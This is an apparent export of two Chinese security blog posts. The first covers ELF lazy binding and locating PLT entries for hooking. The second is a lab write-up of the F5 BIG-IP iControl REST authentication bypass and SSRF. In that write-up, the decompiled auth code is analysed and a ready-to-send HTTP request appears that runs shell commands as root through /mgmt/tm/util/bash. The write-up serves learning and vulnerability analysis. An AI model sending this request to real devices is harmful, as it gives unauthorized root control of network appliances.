[{"categories":["逆向"],"contents":"0x0 前言 在之前做的一些项目中对ELF文件中的函数进行Hook后要调用外部动态链接库函数，因此需要获取外部动态链接库的函数对应在plt表中的地址。对于ELF文件内部函数，其偏移地址可以直接从文件的二进制数据中获取，因为此类函数的偏移都已经写在了文件中；但是对于外部动态库的函数，则没办法直接获取，因为动态库采用了动态链接、延迟绑定技术，只有在第一次调用该函数，该函数的真实地址才会被写入文件中，在此之前记录该函数地址的数据仅为无意义的占位符。\n而该问题的答案并没能直接在网上直接搜索得到，因此在思索得到结果后，写下该博客进行记录。\n0x1 ELF文件结构简述 若要解决获取函数地址的问题，那么自然需要对ELF文件结构有所了解。\n但是在这里，就不对ELF文件进行特别详细的解析，因为对于文件结构，都是做好了规范的死东西，可以从任何一个资料上获取每个字段、每个数据的意义。因此，这里就简要说明一些值得注意的东西。\n0x10 ELF文件两种视图 ELF文件格式规范，将ELF文件分成共享目标文件(shared object file)、可执行文件(executable file)和可重定位文件(relocatable file)。ELF文件的作用也就是用于构建动态链接库或可执行文件，主要体现在链接过程；以及可执行文件用于运行程序，动态链接库参与程序的运行，体现在运行过程，其中动态链接库则属于共享目标文件。根据该ELF文件的特性，ELF文件则可分成两种视图(view)，链接视图(Linking View)与运行视图(Execution View)。\n对于这两种视图，我觉得这样理解会更加容易。链接视图则是ELF文件存储在磁盘时的结构，而运行视图则是ELF文件载入内存后，在内存中的结构。这与PE文件是类似的，PE文件在磁盘与在内存中的结构并不完全相同。\n由 图1-1 ELF文件的两种视图，可以看到两种视图的区别。两种视图仅在节区上发生了变化，由section变成了segment。segment是由一个或者多个类型(sh_type数据)相同的section组成。那为什么这样做呢？当文件从磁盘载入到内存的时候，会根据这部分代码的属性，也就是该部分代码具有读写执行中的哪些权限，分别进行载入处理，若把相同属性的节区组织到一起同时载入，加载器的工作量则减少了，一定程度提高程序载入效率。\n   图 1-1 ELF文件的两种视图    0x11 节 接下来将简述Hook程序所使用到的节，及使用的原因。\n(1) .shstrtab节。要获取多个节区的数据时，需要确定当前遍历到的节头对应的是什么节区，因此需要比较节头的保存的节的名字。对于.shstrtab节来说，其对应的节头在节头表位置固定，即在位于节头表的末尾。该节区保存了所有节的名字，并且保存的顺序与节对应的节头在节头表的顺序相同。因此需要利用.shstrtab节区的数据来遍历节头表。\n(2) .dynsym节。该节保存了与动态链接相关的导入导出函数相关的信息，例如导出函数的起始地址以及函数名字符串在.dynstr节的偏移等。可以通过该节寻找到导出函数的地址，当Hook动态链接库的函数时，就可以通过该节区获取目标导出函数。\n(3) .dynstr节。该节保存了动态符号的字符串表，配合.dynsym节遍历查找目标导出函数。\n(4) .plt与.got节。这两节主要是获取plt表以及got表的起始地址，在Hook程序中需要计算外部导入函数的相对虚拟地址时将会使用到plt表的起始地址，而在调用外部导入函数时则需要将got表的起始地址保存到ebx中，才能正确调用。\n(5) .rel.plt节。该节保存了与plt表的符号的重定位信息，因为ELF文件的延迟绑定机制，无法直接获取外部导入函数的起始地址，因此需要通过重定位表来定位外部导入函数其在plt表的索引，再通过call targetfunc@plt则可以实现对外部导入函数的调用。\n在对.rel.plt节的表述中，就已经透露了获取外部动态库的函数地址的方法。下面会详细的说明\n0x12 延迟绑定 ELF文件为了实现动态链接，使用了两个表。Got表(Global Offset Table)全称为全局偏移表；plt表(Procedure Linkage Table)全称为过程链接表。这两表在ELF文件进行动态链接与延迟重定位的过程中起到关键的作用。在介绍got表与plt表之前先简述何为动态链接与延迟重定位。\n通过将程序使用的模块从程序中拆分出来形成独立的模块，在程序运行并需要使用这些独立的模块时，再将这些模块与程序链接在一起。通过动态链接技术，这些模块导入内存一次便可以供多个程序共享，从而减小了内存的开销，这些模块也被称为动态链接库。该技术的出现就解决了静态链接导致的程序与内存臃肿的问题。但动态链接技术也导致了新的问题，若程序在运行时需要使用动态链接库，那么就会对整个动态链接库进行重定位操作，但是程序并不会在此刻使用到动态链接库的全部数据，因此会导致不必要的性能开销，同时程序运行时会链接大量的动态库，这就会导致程序运行变慢。为了解决这个问题，就提出了延迟重定位技术，该技术又称为延迟绑定。其原理就是通过额外的代码与数据与动态链接库中需要重定位的数据建立联系，那么程序需要哪个数据，就仅对该数据进行重定位，由此解决了不必要的性能开销导致程序运行速度下降的问题。\n在编译过程中编译器是无法获知外部的符号存在于何处的，到了链接阶段，程序可以知道外部符号存在于哪个文件里，如果符号存在于可重定位文件中，即静态链接，链接过程中由于符号地址确定因此可以直接重定位；但如果在共享目标文件中，即动态链接，则因为链接阶段是无法修改编译得到的汇编指令，所以链接阶段无法进行重定位。因此为了解决动态链接重定位的问题，ELF文件由链接器生成了保存外部导入的函数的地址的数据段，与一小段用来获取外部导入的函数的地址的代码。而got表就是用来存放外部导入的函数的地址的数据表，即该表会把位置独立的地址重定向到绝对地址，plt表则是存放了用于获取外部导入的函数的地址的代码，即该表会把位置独立的函数调用重定向到绝对地址。\n那么在ELF文件中，如果调用外部动态链接库中的函数程序会如何实现呢？\n如 图1-2 ELF文件中外部函数的调用过程所示，当程序调用外部导入函数时，call的其实是该外部函数在其对应的plt表项的位置，然后再从其对应的plt表项中跳转到该函数对应的got表项位置，从got表获取该函数的地址后，就可以跳转至该函数的起始地址处了(因为动态链接库被载入内存后也会和载入该库的程序使用同一片虚拟内存)。ELF文件寻找外部函数起始地址的过程需要利用plt表以及got表。\n   图 1-2 ELF文件中外部函数的调用过程    那么这就引出一个问题，plt表长啥样呢？怎么跳转到plt表了后就可以找到got表呢？\n如 图1-3 Plt表结构所示，plt表是由plt表项组成的数组，每个plt表项大小为16字节，除了plt[0]项，其余的项结构都相同。对于plt[0]这一项来说，其第一条指令将got[1]处存放的地址入栈，第二条指令则是跳转到got[2]项中存放的地址执行。对于plt[n]项来说，其保存了某个函数链接时所需要的指令，从plt[1]项与got[3]开始，plt与got表就开始一一对应，即plt[1]对应got[3]，plt[n]对应got[n+2]，n\u0026gt;=1。Plt[n]的第一条指令会跳转到该plt表项对应的got表项处存放的地址执行，第二条指令入栈的值用来作为_dl_runtime_resolve()函数的参数。第三条指令则是跳转到.PLT[0]执行项里保存的两条指令。plt[n]中的前两条指令可以交换顺序，也就是可以先push，再jmp，因为push的数字会在jmp 到plt[0]之后才会使用到，那么got表则跳转回对应的plt的第三条指令而不是原来的第二条指令了。\n   图 1-3 Plt表结构    那么问题又来了，那got表长啥样啊，got表又做了什么呢？\n如 图1-4 Got表的结构所示。got表每个表项为4字节大小。got表的第一项保存了.dynamic节区的地址，第二项保存了link_map链表描述符的地址，该链表保存了程序需要用到的所有动态链接库的信息，例如库的名字以及地址等，通过遍历比较库的名字确定是否是目标函数所存在的库。动态链接器也将使用link_map链表描述符的地址进行符号解析。got[1]项保存的地址在plt[0]中被入栈，同样是作为_dl_runtime_resolve()函数的参数。第三项保存的则是_dl_runtime_resolve函数的地址，在plt[0]项的第二条指令会跳转到got[2]保存的地址去执行_dl_runtime_resolve函数。\n当执行完_dl_runtime_resolve()函数后，目标函数的真实地址将被找到，并且会将该地址写入目标函数对应的got表项中。下一次再次调用目标函数时则将直接跳转到got表存放的地址执行函数，不用再进行重定位。因此可以看到图1-4中在延迟绑定之后，数据变成了函数地址，而不是plt[n]的第二条指令的地址了。\n   图 1-4 got表结构    还记得plt[n]中push的数字吗？目标函数对应的plt表项中的第二条指令入栈的数字表示该函数在.rel.plt节区的偏移，而.rel.plt节区中，每个项的offset成员则是其got表项的地址，_dl_runtime_resolve()函数则可以通过该信息回写got表。\n综上，可以得到 图1-5 延迟绑定过程。当程序调用外部导入函数时，程序会进入该函数对应的plt表项执行指令。指令的执行首先会让程序跳转到对应的got表项保存的地址，若此时是第一次调用则会跳转到对应的plt表项的第二条指令，否则将直接跳转到目标函数起始地址处。Plt表项的第二条指令将该函数所对应的位于.rel.plt节区的项的偏移入栈，然后跳转到plt[0]项中将link_map地址入栈，再跳转到_dl_runtime_resolve函数起始地址开始执行该函数，该函数会调用目标函数，并将目标函数的真实地址写入目标函数对应的got表中(此步骤会依赖.rel.plt节区中的数据)。最后执行完目标函数后返回到调用目标函数指令的下条指令上。\n   图 1-5 延迟绑定过程    0x13 重定位表 在ELF文件中，以\u0026quot;.rel\u0026quot;开头的都属于重定位段，他是一个Elf32_Rel结构数组，每个项对应一个重定位入口。.rel.plt是对函数引用进行修正，在该博客中则需要使用.rel.plt段来获取外部函数地址。\n如 图1-6 Elf32_Rel结构所示，重定位表的每个项都有两个成员，分别为offset和info。对于offset成员来说，其是重定位入口的偏移地址，即该符号对应的got表项地址，因此当重定位后将外部函数的真实地址回写到对应的got表项则是依赖于该数据，info成员则是表示该重定位入口的类型，该成员大小为4个字节，高24位表示该符号在符号表中的下标，低8位为info数据。\n   图 1-6 elf32_rel结构.png    那么以上就是要弄清楚如何从ELF文件中获取外部动态链接库函数地址所需的前提知识了。\n0x2 获取ELF文件内部函数地址 ELF文件内部地址很容易获取，因此简略的说一下。\n如 图2-1 内部函数在符号表中保存的地址数据所示，对于存在符号表的ELF文件，那么内部函数可以在符号表(symtab)中获取，动态符号例如导出函数还可以在动态符号表(dynsym)获取其地址。\n   图 2-1 内部函数在符号表中保存的地址数据    如 图2-2 存储在.data节区中的内部函数地址数据所示，如果ELF文件中没有符号表，那么除了导出函数的函数地址可以从动态符号表获取，其余内部函数只能从.data节区的数据获取内部函数地址，例如图中的 dd offset sub_5F488的数据就是sub_5F488的函数地址。\n   图 2-2 存储在.data节区中的内部函数地址数据    0x3 获取ELF文件外部动态链接库函数地址 在0x12的延迟绑定分析中，程序调用外部函数则是通过call该函数对应的plt表项地址来实现的。因此关键问题是如何获取外部动态链接库函数对应plt表项的地址。\n在分析plt表的过程中，注意到push的数字与plt表项的索引有着对应关系，从plt[1]开始，该项的push的数字则为0，plt[2]中push的为8，依次push的就是(n-1)*8了。前面也提到了，push的数字为该函数在.rel.plt重定位表中的偏移，因此只要定位到了外部导入函数对应的重定位表数据，就可以倒推出对应的plt表的位置。如 图3-1 plt表与重定位表对应示例所示，readlink对应的plt[1] push了0，而该函数在.rel.plt表的第一项；sem_trywait对应plt[2] push了8，该函数在.rel.plt表的第二项。\n   图 3-1 plt表与重定位表对应示例    那么如何定位该外部函数位于重定位表的哪个位置呢？\n在前面我们提到重定位表中的Elf32_Rel结构的info成员的高24位代表该符号在符号表的下标，那么通过该下标就可以获取该符号的名称，那么与函数名进行对比即可定位到目标外部导入函数了。实现的方法如 图3-2 通过重定位数据对比符号名称所示，首先获取info成员高24位数据，通过它获取符号表的名称，在与外部导入函数名称对比即可判断该重定位项是否是目标外部导入函数的。\n   图 3-2 通过重定位数据对比符号名称    当确定了该重定位项就是目标外部导入函数的之后，就可以计算该项在重定位表的偏移了，然后根据重定位表偏移 = (n-1)*8算出n，在用plt表起始地址 + n*0x10即可获得到对应的plt表项的地址了。\n如 图3-3 计算对应的plt表项地址所示，首先获取重定位表第一项的offset数据，然后在获取目标外部导入函数的offset数据，然后作差除以4，那么结果就是该重定位项在重定位表的偏移了。因为重定位向的offset数据为目标外部导入函数在got表的地址，而got表与plt表有对应关系，自然也与重定位表也有对应关系。got表与重定位表的对应关系则是got[n] \u0026lt;\u0026ndash;\u0026gt; .rel.plt[n-3]，n\u0026gt;3。got表项大小为4，因此 n-3 = (address of got[n] - address of got[4])/4 刚好为该重定位项在重定位表的偏移。那么最后就通过plt表起始地址 + n*0x10算出目标外部导入函数所在plt表项的地址了。\n   图 3-3 计算对应的plt表项地址    实现代码 实现代码\n","permalink":"http://int80.top/22-12-12/","tags":["ELF文件"],"title":"ELF文件延迟绑定过程与获取外部动态库函数对应的plt表项地址"},{"categories":["CVE"],"contents":"0x0 前言   什么是F5 BIG-IP? F5 Big-IP是F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台\n  漏洞所在 iControl REST 接口存在未认证远程命令执行漏洞\n  漏洞影响 该漏洞允许未认证的攻击者通过网络访问iControl REST接口，然后通过BIG-IP的管理界面和自身IP地址来执行任意系统命令，例如创建或删除文件以及禁用服务。这个漏洞仅能通过控制面板(control plane)利用，不能通过数据面板利用。该漏洞利用会导致整个系统陷入危险。BIG-IP系统的设备模式(Appliance mode)同样是可受攻击的。\n  reference\n360分析\nAl1ex\nbrandonshi123\nattackerkb\n  之前接触的都是二进制软件安全，并没有接触过web安全，但因为之后会进入网络安全行业，所以需要拥有一些基础，对该技术方向拥有一个概念。因此以该CVE为学习契机进行网络安全的学习。 该博客是站在其他研究员做的结论的肩膀上编写的，很多内容和reference有重复，更重要的是，很多困难却又关键的地方，都是从他们那里直接获取结论，而不需要自己再去一步步分析才能得到结果，但是自己都尽量汲取知识，自己动手尝试了。同时在学习以及复现的过程中，反思得到以下结论，这些结论我觉得会对之后的研究深耕会有一定程度的帮助。\n 如何定位vulnerability?这是最难也是最关键的的一步，结合我学习的知识，对于一个大型软件来说，不可能人工代码审计去找攻击点，费时费力效率低，只能通过自动化的方法去获取vulnerability，例如fuzz技术，或者污点追踪，符号执行，甚至三种技术结合，这样才能有效定位vulnerability。从brandonshi123的reference博客中，他们是团队合作，首先fuzz了整个应用的目录查找到以非正确的认证报文获得了200 OK的response后才获取关键字，然后根据关键字才定位了bypass authorization发生的代码处。那么从关键字到定位关键代码处，这一个过程又需要人工分析大量代码才能完成定位，而这一过程又涉及到逆向工程，代码审计。综上，定位vulnerability是我在此次训练中没能完成的，以我的能力以及掌握的知识广度来说，我们办法完成定位，同时这也反映了，在之后的学习以及工作中，一定要提升定位vulnerability的能力，这同时也是一个安全研究员的能力强弱重要判定因素。 对于网络安全来说，知识面的广度与知识掌握的深度同样重要。广度让你能对更多信息更加敏感从而抓住更加细节的东西，而这些往往是关键所在，例如，apache服务的认证是通过mod_auth_pam.so库，如果知道这一点，那么就可以迅速定位。如果放大到更广的方向，网络安全范围很大，也许今天的软件是java写的，而我刚好掌握java知识，那么我可以更轻松的完成任务，但如果明天要分析的软件是rust写的，那么如果对rust特性以及rust应用特性的了解，同样可以意识到这些特性哪里容易出问题。对于逆向工程，很多软件使用不同框架，不同语言编写，这就要求研究员们对各种框架都有一个概念，或者说能通过经验判别出这是利用了某个框架的api，从而去学习这个框架然后才能进行下一步的逆向分析。但如果知识面广度不够，即使线索摆在了面前，也很难反应过来原来这就是漏洞的原因并抓住。  0x1 漏洞靶机环境搭建 官网注册账号，地区不要选择中国，并且如果ip地址在中国的话会被告知Export Compliance check - failure，导致无法下载，这个时候就需要魔法上网了 下载16.0.1版本的virtual Edition，如下图\n下载完成后使用VMWARE打开，将BIG-IP系统导入。 导入成功，启动虚拟机则有如下界面\n当第一次启动BIG-IP系统后会要求填写localhost login and password BIG-IP初始账号密码为root/default 登陆成功后会要求立即更改root的密码\n在命令行输入config，获取BIG-IP的IP信息\n来到浏览器，输入URL:https://192.168.124.16 得到如下界面\n这里username 填入admin，password 填入我们更改的新密码 成功登录后会要求我们修改新密码。 再次登录即可进入系统界面。 首先进入页面会需要key进行注册，这里可以通过申请30天试用key网站获取\n若key验证成功则会获得Dossier，然后将该Dossier激活即可。\n激活成功则会出现协议，同意即可。 接着会给出license key，我们要复制到Dossier界面下面的文本框中\n若能成功激活，则有如下界面\n如此就建立好了漏洞靶机。\n0x2 漏洞原理分析 0x20 RCE HTTP请求如何到达后端服务器：当客户端发送一个HTTP请求后，首先会经过Apache,然后Apache做一些认证和头部检验，接着会将请求传递给使用JAVA编写的Jetty服务，在Jetty中做一些其他的身份认证事情，然后回应客户端。\n在Big-IP中，https:/mgmt URL就是用来管理的，因此他将会要求身份认证。在brandonshi123的reference中，作者团队通过fuzz发现https:///mgmt/toc要求帐号和密码，但是却返回了200 OK，这个状态码表示请求成功。因此他们在服务器端以/mgmt/toc为关键词进行搜索，找到Apache的一个公共库mod_auth_pam.so,并判断authentication bypass就存在该so文件里\n通过空的HTTP X-F5-Auth-Token和仅拥有username： Authorization:Basic$(base64_encode(\u0026ldquo;admin:\u0026quot;)) 基本身份认证头就可以绕过身份验证.基本的身份验证只检查username，而不是password\nAPI在 https:///mgmt/tm/util/bash 执行系统命令,因此unauthenticated RCE 就是在此实现的。\n在该应用中会发生两次认证，分别是apache和jetty服务的验证，因此有两种头部可以绕过验证。\n在这里先给出结论，分析代码后，我们通过Burpsuit进行发包验证。\n首先，我们需要从漏洞靶机获取两个验证所在的代码。第一个是Apache的认证代码，其存在mod_auth_pam.so中，其是Apache的共享库，我们从漏洞靶机的/usr/lib/httpd/modules文件夹中可以获取。第二个是Jetty的认证代码所在，其存在于漏洞靶机的/usr/share/java/rest/中，文件名为f5.rest.jar。\n使用IDA打开mod_auth_pam.so文件，我们需要查找代码中使用了X-F5-Token字符串的代码，从而确定其在代码流程图的位置，首先在string window搜索Token，我们就可以直接查找到该字符串了，如下图\n接着双击该字符串，就能跳转至该字符串存在的段中，接着右键aXF5AuthToken，选择List cross reference to\u0026hellip;选项找到调用该字符串的代码，得到如下图，双击跳转即可得到该字符串调用代码所在流程图的位置了\n接着来分析它的代码，这里调用了一个_apr_table_get的函数，这是Apache提供的c语言编程库，我们可以在网上搜索到该函数的作用\n1 2 3 4 5 6 7 8  /** * Get the value associated with a given key from the table. After this call, * The data is still in the table * @param t The table to search for the key * @param key The key to search for * @return The value associated with the key, or NULL if the key does not exist. */ APR_DECLARE(const char *) apr_table_get(const apr_table_t *t, const char *key);   由上述对apr_table_get函数的描述可知，如果该key存在该函数会从table中返回key的value，如果该key值不在table中存在就会返回空值。\n因此上述调用了X-F5-Auth-Token的代码就是在做一件事，由最后两行的test eax,eax(若返回NULL，即没有X-F5-Auth-Token字段，该指令会将ZF置1) 和 jz loc_8766 可以知，该事情就是判断X-F5-Auth-Token是否存在于table中。也就是说报文是否拥有X-F5-Auth-Token字段。\n接着看如果存在会执行什么代码，不存在又会执行什么代码\n如果将IDA沿着红线追踪(即存在X-F5-Auth-Token字段的话)，会发现Apache的处理已经到了收尾阶段，如果程序运行无差错则会将报文发送给jetty服务。如下图:\n如果IDA沿着绿线追踪(即没有X-F5-Auth-Token字段的话)，会看到Apache将会进行Basic Auth检验。首先会判断报文是否存在Authorization字段，然后进行Basic auth的检验，会对账号密码进行检验。\n综上，Apache服务只检查X-F5-Auth-Token存不存在，而不检查正不正确，如果不存在就会去进行basic auth检验,否则就跳过basic auth的检验，直接将request传递给jetty服务，因此我们伪造空X-F5-Auth-token就可避免Apache对basic auth的检验。\njetty server中 f5.rest.workers.authz.AuthzHelper.class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public static BasicAuthComponents decodeBasicAuth(String encodedValue) { BasicAuthComponents components = new BasicAuthComponents(); if (encodedValue == null) { return components; } String decodedBasicAuth = new String(DatatypeConverter.parseBase64Binary(encodedValue)); int idx = decodedBasicAuth.indexOf(\u0026#39;:\u0026#39;); if (idx \u0026gt; 0) { components.userName = decodedBasicAuth.substring(0, idx); if (idx + 1 \u0026lt; decodedBasicAuth.length()) { components.password = decodedBasicAuth.substring(idx + 1); } } return components; }   将basic auth头进行解码，以\u0026rdquo;:\u0026ldquo;作为分隔符，分割出username和password，然后存入component中\n在f5.rest.RestOperationIdentifier.class中\n1 2 3 4 5 6 7 8 9 10  private static boolean setIdentityFromBasicAuth(RestOperation request) { String authHeader = request.getBasicAuthorization(); if (authHeader == null) { return false; } AuthzHelper.BasicAuthComponents components = AuthzHelper.decodeBasicAuth(authHeader); request.setIdentityData(components.userName, null, null); return true; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public RestOperation setIdentityData(String userName, RestReference userReference, RestReference[] groupReferences) { if (userName == null \u0026amp;\u0026amp; !RestReference.isNullOrEmpty(userReference)) { String segment = UrlHelper.getLastPathSegment(userReference.link); if (userReference.link.equals(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, segment })))) { userName = segment; } } if (userName != null \u0026amp;\u0026amp; RestReference.isNullOrEmpty(userReference)) { userReference = new RestReference(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, userName }))); } this.identityData = new IdentityData(); this.identityData.userName = userName; this.identityData.userReference = userReference; this.identityData.groupReferences = groupReferences; return this; }   如果userReference为空，就对userReference进行构造,即buildUriPath函数 上述代码的buildUriPath就是用来拼接字符串的函数，只需知道这个功能即可\n1  userReference = new RestReference(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, userName })));   里面的WellknownPorts.AUTHZ_USERS_WORKER_URI_PATH定义为\n1  public static final String AUTHZ_USERS_WORKER_URI_PATH = UrlHelper.buildUriPath(new String[] { AUTHZ_WORKER_URI_PATH, \u0026#34;users\u0026#34; });   这里的AUTHZ_WORKER_URI_PATH又定义为\n1  public static final String AUTHZ_USERS_WORKER_URI_PATH = UrlHelper.buildUriPath(new String[] { AUTHZ_WORKER_URI_PATH, \u0026#34;users\u0026#34; });   该class对request进行拆解获取其的变量，request变量内容如下\n1 2 3  identityData.userName = \u0026#39;admin\u0026#39;; identityData.userReference = \u0026#39;http://localhost/mgmt/shared/authz/users/admin\u0026#39; identityData.groupReference = null;   我们可以看到identityData只保存了userName而没有保存Password。这是因为REST服务器默认Basic Authorization数据已经由Apache进行认证，所以不需要重新验证账号密码，所以在Jetty服务端就只根据用户名。 F5.rest.jar中有authn和authz两种class。authn有BIG-IPAuthCookie以及其他与BIG-IP有关的cookie，而authz库中只有basic auth相关的方法函数。因此判断出若请求中有BIG-IP相关的Cookie则由authn认证，若有Authorization则有authz进行认证。\n在jetty服务中会发生第二个bypass authorization。该pypass发生在f5.rest.workers.EvaluatePermissions.class中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  private static void completeEvaluatePermission(final RestOperation request, AuthTokenItemState token, final CompletionHandler\u0026lt;Void\u0026gt; finalCompletion) { final String path; // 1. 因为bypass中X-f5-Auth-Token为空，所以token没有值， 所以是null，绕过第一个F5 token的认证  if (token != null) { if (token.expirationMicros.longValue() \u0026lt; RestHelper.getNowMicrosUtc()) { String error = \u0026#34;X-F5-Auth-Token has expired.\u0026#34;; setStatusUnauthorized(request); finalCompletion.failed(new SecurityException(error), null); return; } request.setXF5AuthTokenState(token); } // 2. 此处的request是前面返回的request变量，即identityData中的数据，这个setBasicAuthFromIdentity仅将identity.userName重新进行编码，并不会查看密码，而且identityData里也没有存密码。  request.setBasicAuthFromIdentity(); //3. 由于uri不符合所以跳过以下两个比较  if (request.getUri().getPath().equals(EXTERNAL_LOGIN_WORKER) \u0026amp;\u0026amp; request.getMethod().equals(RestOperation.RestMethod.POST)) { finalCompletion.completed(null); return; } if (request.getUri().getPath().equals(UrlHelper.buildUriPath(new String[] { EXTERNAL_LOGIN_WORKER, \u0026#34;available\u0026#34; })) \u0026amp;\u0026amp; request.getMethod().equals(RestOperation.RestMethod.GET)) { finalCompletion.completed(null); return; } //4. 此处的userRef是admin的ref，因为basic auth的用户名是admin,形式应该为identityData.UserReference  final RestReference userRef = request.getAuthUserReference(); //若userRef为空  if (RestReference.isNullOrEmpty(userRef)) { String error = \u0026#34;Authorization failed: no user authentication header or token detected. Uri:\u0026#34; + request.getUri() + \u0026#34; Referrer:\u0026#34; + request.getReferer() + \u0026#34; Sender:\u0026#34; + request.getRemoteSender(); setStatusUnauthorized(request); finalCompletion.failed(new SecurityException(error), null); return; } //因为admin是DefaultAdminRef， 所以认证成功  if (AuthzHelper.isDefaultAdminRef(userRef)) { finalCompletion.completed(null); return; } //认证成功所以并不会执行以下所有代码  ......(后面还有一段，但认证成功就不会执行了)   对于第2条2.注释的setBasicAuthFromIdentity我们可以看下它是如何对Identity数据处理的\n1 2 3 4 5  public void setBasicAuthFromIdentity() { if (this.authorizationData == null) return; this.authorizationData.basicAuthValue = AuthzHelper.encodeBasicAuth(getAuthUser(), null); }   再看getAuthUser的代码\n1 2 3  public String getAuthUser() { return (this.identityData == null) ? null : this.identityData.userName; }   可以看出getAuthUser仅仅获取了identityData的userName数据 encodeBasicAuth实现如下:\n1 2 3 4 5 6  public static String encodeBasicAuth(String user, String password) { if (user == null) return null; String userPass = String.format(\u0026#34;%s:%s\u0026#34;, new Object[] { user, (password == null) ? \u0026#34;\u0026#34; : password }); return DatatypeConverter.printBase64Binary(userPass.getBytes()); }   因为encodeBasicAuth的第二个参数传入的为NULL，因此encodeBasicAuth就是对user:null进行Base64的编码处理，可以看出其并没有采用Authorization中的用户名和密码，而是将密码置NULL 再到第三条3.注释的两个if代码，是进行Uri路径匹配，其中EXTERNAL_LOGIN_WORKER对应的是\n1  public static final String WORKER_URI_PATH = UrlHelper.buildUriPath(new String[] { \u0026#34;shared/\u0026#34;, \u0026#34;authn\u0026#34;, \u0026#34;login\u0026#34; });   即uri = shared/authn/login，但是我们访问的uri却是shared/authz/users/admin?是这个原因导致的不匹配吗。(还是说对比的uri是tm/util/bash，然后才导致的不匹配？) 当上述两个if的uri匹配失败则调用getAuthUserReference函数，又因为authUserReference非空，因此跳过下面的if 接着判断userRef是否是DefaultAdminRef。 isDefaultAdminRef函数代码如下:\n1 2 3 4  public static boolean isDefaultAdminRef(RestReference userReference) { RestReference defaultReference = getDefaultAdminReference(); return (defaultReference != null \u0026amp;\u0026amp; defaultReference.equals(userReference)); }   那么其中的就是getDefaultAdminReference就是获取DefaultAdminReference的关键了，其代码如下\n1 2 3 4 5  public static RestReference getDefaultAdminReference() { if (DEFAULT_ADMIN_NAME == null) return null; return new RestReference(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, DEFAULT_ADMIN_NAME }))); }   这里的DEFAULT_ADMIN_NAME定义如下\n1 2 3  public static String DEFAULT_ADMIN_NAME = \u0026#34;admin\u0026#34;;   而AUHZ_USERS_WORER_URI_PATH在前面也提到过了。最后的DefaultAdminRef就是shared/authz/users/admin，与identity.userReference相同因此进入if并return，不会再执行后面的代码。\n总结一下，首先http请求经过Apache服务时，发生一次身份认证，如果存在X-F5-Token就不会检验basic auth的正确性，与X-F5-Token的有效性也无关。request通过Apache传递到Jetty服务后，会判断X-F5-Token是否为空，为空即跳过第一步Jetty验证，接着会判断IdentityData.usereference是否为默认的admin的reference，如果是则通过验证，这第二次bypass就是利用了jetty服务不会对通过httpd认证的请求进行二次认证的缺陷。因此我们只需要伪造一个有着空的X-F5-Token以及用户名正确，而密码错误的报文即可绕过两次身份验证。\n我们通过Burpsuit进行发包检测我们的原理分析是否正确 我们使用Burpsuit的proxy对https:///mgmt/tm/util/bash进行抓包，然后在repeater中对该报文进行改包再发送进行测试。\n 当只添加X-F5-Token字段时  可以看到request可以发送给jetty服务。\n 当只添加Authorization字段时  可以看到此时并没有通过apache服务的验证，并且在下面的文本提示中显示\u0026quot;Unauthorized\u0026rdquo;，并且说明验证未通过。 这里有同学可能会疑惑，Authorization字段内容为什么是 Basic和一段加密密码呢？这是HTTP Basic Auth协议规定的。其规定的形式为\n1  Authorization: Basic base64encode(username+\u0026#34;:\u0026#34;+password)    同时添加X-F5-Token和Authorization字段时  可以看到此时request也传递到了jetty服务中，通过对比实验，可以验证我们对漏洞原理的分析是正确的。\n0x21 SSRF 除了RCE漏洞，该软件还存在SSRF漏洞。\n我们这里直接引用360的reference的结论，在f5.rest.jar中的com.f5.rest.workers.authn.AuthnWorker#onPost方法中增加了对loginReference.link的校验，那么由此可知onPost是SSRF漏洞的突破点。\n当我们要构造漏洞利用报文，我们就需要知道需要构造哪些字段，哪些内容。在onPost方法中，如下图所示两个对象 - state与loginState，就是我们需要关注的输入点\n前面的结论中对loginReference.link添加了校验，而该变量存在于state对象中，因此该变量可控。同时也是关键。\n由上图可看到，sendPost会向state.loginReference发出请求。当post请求处理完成后未发生异常，就会执行completed()方法，该方法中会将访问loginReference.link返回的JSON数据根据字段赋值给loggedIn，然后会调用AuthWorker.generateToken()函数生成Token\n再看generateToken()函数\n在generateToken函数中会将loggedIn各字段赋值给token对象，如果访问的loginReference.link目标url返回的json数据中userReference字段为null时，就会执行到如下代码\n收到的报文就会因此出现如下图所示的错误\n因此在构造报文的时候，填写的loginReference.link目标url必须返回userReference字段不为null的json数据。 这里直接给出结论，loginReference.link: /shared/gossip(/mgmt/shared/gossip)符合条件 继续往下看可以发现生成的token会通过completed()方法完成映射和返回。在completed()方法中存在RestOperation.complete()方法，作为处理请求结束的代码。\n因此如果想要获得返回Token的报文，就需要寻找符合以下条件的子类:\n 存在onPost方法可以处理POST请求 onPost方法中可以控制执行流到RestOperation.complete()方法中  当response报文返回生成的token后，我们构造攻击报文，将其填入X-F5-Token中即可获取系统权限。\n0x3 漏洞利用 0x30 RCE 因为我们已经得到结论，https:///mgmt/tm/util/bash 路径是用来执行系统命令的，因此我们直接构造数据包，通过Burpsuit的Repeater功能进行发包获取权限，从而实现RCE漏洞利用。 构造的数据包如下:\n1 2 3 4 5 6 7 8 9 10  POST /mgmt/tm/util/bash HTTP/1.1 Host: 192.168.1xx.1x X-F5-Auth-Token: Authorization: Basic YWRtaW46 Content-Length: 55 { \u0026#34;command\u0026#34;: \u0026#34;run\u0026#34;, \u0026#34;utilCmdArgs\u0026#34;: \u0026#34;-c id\u0026#34; }   Burpsuit结果，如下图:\nresponse报文返回了我们通过该报文获取的系统权限，uid=0,gid=0也正是linux系统下root的id号，因此我们夺取了系统的root权限。那么我们只需要构造这样的报文，在添加相应的执行命令即可实现RCE漏洞的利用，能够对系统进行威胁了。\n0x31 SSRF 